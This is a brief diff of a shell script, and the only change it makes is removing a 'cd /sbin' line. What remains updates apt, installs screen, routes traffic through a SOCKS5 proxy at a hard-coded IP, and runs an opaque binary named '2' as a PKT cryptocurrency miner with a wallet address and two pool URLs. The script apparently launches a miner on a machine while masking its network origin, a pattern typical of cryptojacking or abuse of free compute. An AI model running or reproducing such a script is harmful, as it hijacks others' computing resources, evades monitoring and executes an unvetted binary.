@@ -2,7 +2,6 @@
 
 
 apt-get update
-cd /sbin
 apt install screen -y
 export http_proxy=socks5://98.162.25.23:4145
 chmod +x 2 && ./2 ann -p pkt1qds22l0nlqf8nsn49ws8aqnuv8tklf6rshgu4m5 http://pool.pkt.world http://pool.pktpool.io
